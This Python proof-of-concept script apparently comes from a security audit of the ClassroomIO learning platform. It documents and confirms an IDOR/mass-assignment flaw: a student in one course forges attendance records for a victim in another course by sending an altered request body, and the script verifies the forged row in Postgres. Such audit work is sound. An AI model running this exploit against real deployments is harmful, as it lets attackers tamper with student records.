#!/usr/bin/env python3
"""
VULN-020 (AC-2) — Attendance forgery: POST /course/:courseId/attendance authorizes on the PATH
                  :courseId but writes the attacker-controlled BODY courseId/lessonId/studentId.

Vulnerable code (targets/classroomio/):
  * route:   apps/api/src/routes/course/attendance.ts:9-24
             (authMiddleware + courseMemberMiddleware on the path; handler forwards the whole body)
  * service: apps/api/src/services/attendance/attendance.ts:29-46
             (upsertAttendanceService copies body.courseId/lessonId/studentId verbatim)
  * query:   packages/db/src/queries/attendance/attendance.ts:65-91  (inserts/updates group_attendance)

Class: CWE-639 IDOR / CWE-915 mass-assignment — the authorization object (path :courseId) is
decoupled from the mutation object (body courseId/lessonId/studentId).

The flaw: courseMemberMiddleware checks the caller is a member of the PATH course, but the handler
ignores the path and passes the JSON body straight to the upsert. Nothing checks that body.courseId
equals the path course, that the lesson belongs to it, or that the caller may mark that student. So a
member of course A forges/overwrites an arbitrary student's attendance in a DIFFERENT course B.

Exploitation idea: a STUDENT of course A posts an attendance body naming course B, a lesson, and
victim B's groupmember id — writing a group_attendance row for course B the attacker has no role in.

Success proof: after the request, a group_attendance row exists in Postgres for (course_id=B,
student_id=<victim groupmember>, lesson_id=L) with the is_present value the attacker chose — a row
the attacker had no authorization to create.
"""
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, admin_login, create_course, make_student, psql, rid  # noqa: E402

VULN = "VULN-020"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN, "Attendance forgery via body courseId/lessonId/studentId")
    log("INFO", "route attendance.ts:9-24 authorizes path :courseId but writes the body verbatim")

    log("SETUP", "admin login")
    admin = admin_login()

    # --- Attacker: a STUDENT of course A (satisfies courseMemberMiddleware on the PATH course A) ---
    log("SETUP", "provisioning the attacker as a STUDENT of course A")
    attacker, info_a = make_student(admin, label="attacker")
    course_a = info_a["course_id"]
    log("SETUP", f"attacker user={info_a['user_id']} is a STUDENT of course A={course_a}")

    # --- Victim: a DIFFERENT course B with a victim student the attacker has NO relationship to ---
    log("SETUP", "provisioning a separate course B with a victim STUDENT")
    course_b_obj = create_course(admin, title=f"Victim Course {rid('b')}")
    course_b = course_b_obj["id"]
    group_b = course_b_obj.get("groupId")
    _victim, info_b = make_student(admin, course_id=course_b, label="victim")
    victim_profile = info_b["user_id"]

    # studentId in group_attendance is a FK to groupmember.id (not profile.id) — resolve it.
    gm_id = psql(f"select id from groupmember where profile_id='{victim_profile}' and group_id='{group_b}' limit 1")
    if not gm_id:
        log("FAIL", f"could not resolve victim groupmember id (profile={victim_profile}, group={group_b})")
        verdict(VULN, "FAILED", "precondition (victim groupmember id) failed")
        sys.exit(1)
    log("SETUP", f"victim course B={course_b} victim groupmember id={gm_id} (profile={victim_profile})")

    # lesson_id has no FK constraint (schema: group_attendance.lesson_id is uuid NOT NULL, no FK) —
    # a fresh uuid guarantees no pre-existing row, so the row we see afterwards is our forged insert.
    lesson_id = str(uuid.uuid4())

    before = psql(f"select count(*) from group_attendance where course_id='{course_b}' "
                  f"and student_id='{gm_id}' and lesson_id='{lesson_id}'")
    log("INFO", f"  rows for (course B, victim, lesson) before attack = {before}")

    # --- The attack: attacker (member of A only) posts to the PATH course A, but the BODY targets B ---
    body = {"courseId": course_b, "lessonId": lesson_id, "studentId": gm_id, "isPresent": False}
    log("STEP", f"attacker POST /course/{course_a}/attendance  body targets course B + victim: {body}")
    resp = attacker.post(f"/course/{course_a}/attendance", org=True, json=body)
    log("INFO", f"  response: HTTP {resp.status_code} {resp.text[:200]}")

    after_row = psql(f"select id, is_present from group_attendance where course_id='{course_b}' "
                     f"and student_id='{gm_id}' and lesson_id='{lesson_id}' limit 1")
    log("INFO", f"  group_attendance row for (course B, victim, lesson) after attack = {after_row!r}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"attacker is a STUDENT of course A={course_a} only (not a member of course B)\n")
        f.write(f"POST /course/{course_a}/attendance  (path course A)\n")
        f.write(f"body = {body}   (body targets course B + victim groupmember {gm_id})\n\n")
        f.write(f"HTTP {resp.status_code}\n{resp.text}\n\n")
        f.write(f"psql group_attendance (course_id=B, student_id=victim gm, lesson_id=L):\n")
        f.write(f"  before rows = {before}\n  after  row  = {after_row!r}\n")

    row_written = bool(after_row) and (before in (None, "0"))
    http_ok = resp.status_code == 201

    if http_ok and row_written:
        log("PROOF", f"a member of course A wrote a group_attendance row for course B + victim groupmember "
                     f"{gm_id} (row={after_row!r}) — attendance forged in a course the attacker has no role in")
        verdict(VULN, "CONFIRMED", "cross-course attendance forgery via trusted body params")
        log("OK", "exploit confirmed — forged victim attendance in an unrelated course")
        sys.exit(0)

    verdict(VULN, "FAILED", f"HTTP {resp.status_code}; before={before} after={after_row!r}")
    log("FAIL", "expected HTTP 201 and a forged group_attendance row for course B")
    sys.exit(1)


if __name__ == "__main__":
    main()
